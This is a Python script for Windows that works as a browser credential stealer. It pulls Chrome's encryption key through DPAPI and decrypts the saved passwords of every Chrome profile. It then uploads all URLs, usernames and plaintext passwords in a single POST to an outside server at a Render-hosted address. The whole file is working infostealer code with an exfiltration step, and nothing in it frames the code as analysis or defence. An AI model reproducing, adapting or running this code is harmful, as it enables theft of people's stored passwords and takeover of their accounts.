import os
import sys
import json
import time
import base64
import sqlite3
import shutil
import win32crypt
import requests
from Cryptodome.Cipher import AES
import re
from datetime import datetime, timedelta

def get_chrome_datetime(chrome_date):
    """Convert Chrome format datetime to Python datetime"""
    if chrome_date:
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)
    return datetime.now()

def get_encryption_key():
    """Get the encryption key used by Chrome"""
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]  # Remove DPAPI prefix
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    """Decrypt the password using the encryption key"""
    try:
        iv = password[3:15]
        encrypted_password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)
        return decrypted_password[:-16].decode()
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return ""

def extract_chrome_passwords():
    """Extract passwords from Chrome"""
    print("Extracting Chrome passwords...")
    
    # Get encryption key
    key = get_encryption_key()
    
    chrome_path = os.path.join(os.environ["USERPROFILE"], 
                              "AppData", "Local", "Google", "Chrome", 
                              "User Data")
    
    profiles = ["Default"]
    folder_list = os.listdir(chrome_path)
    profiles.extend([folder for folder in folder_list if folder.startswith("Profile")])
    
    passwords = []
    
    for profile in profiles:
        try:
            db_path = os.path.join(chrome_path, profile, "Login Data")
            if not os.path.exists(db_path):
                continue
                
            temp_db = "temp_chrome_db"
            if os.path.exists(temp_db):
                os.remove(temp_db)
                
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
                
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                date_created = row[3]
                
                decrypted_password = decrypt_password(encrypted_password, key)
                creation_date = get_chrome_datetime(date_created).timestamp()
                
                if username and decrypted_password:
                    passwords.append({
                        "url": url,
                        "username": username,
                        "password": decrypted_password,
                        "timestamp": str(creation_date)
                    })
                
            cursor.close()
            conn.close()
            os.remove(temp_db)
            
        except Exception as e:
            print(f"Error extracting passwords from {profile}: {e}")
            continue
    
    print(f"Found {len(passwords)} passwords")
    return passwords

def extract_and_upload():
    print("Starting Chrome password extraction...")
    
    try:
        # Extract passwords locally
        passwords = extract_chrome_passwords()
        
        if not passwords:
            print("No passwords found or extraction failed")
            return
            
        # Upload to server
        server_url = "https://mock-porfolio.onrender.com"
        
        print(f"Uploading {len(passwords)} passwords to server...")
        response = requests.post(
            f"{server_url}/api/user-password",
            json=passwords
        )
        
        if response.status_code == 200:
            result = response.json()
            print(f"Success: {result.get('message', 'Passwords uploaded')}")
        else:
            error_message = response.json().get('error', 'Unknown error')
            print(f"Error: Failed to upload passwords - {error_message}")
            
    except Exception as e:
        print(f"Error: An unexpected error occurred - {str(e)}")

if __name__ == "__main__":    
    extract_and_upload()